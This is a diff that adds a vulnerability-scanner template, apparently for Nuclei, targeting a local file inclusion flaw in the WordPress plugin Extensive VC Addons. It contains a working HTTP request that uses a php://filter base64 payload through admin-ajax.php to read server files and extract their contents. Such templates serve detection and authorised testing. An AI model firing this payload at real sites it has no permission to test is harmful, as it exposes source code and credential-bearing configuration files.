@@ -1,0 +1,36 @@
+id: wordpress-plugin-extensive-vc-file-inclusion
+info:
+  name: WordPress Plugin Extensive VC Addons File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Extensive VC Addons < 1.9.1 is vulnerable to Local File Inclusion, allowing attackers to read sensitive files like source code and database configuration files.
+  reference:
+    - https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809
+  tags:
+    - file-read
+    - file-inclusion
+    - wordpress
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=../wp-content/plugins/extensive-vc-addon/shortcodes/shortcodes-functions.php
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "extensive_vc_get_module_template_part"
+      - type: regex
+        regex:
+          - '"data":"(.+?)"'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"data":"(.+?)"'
+        group: 1
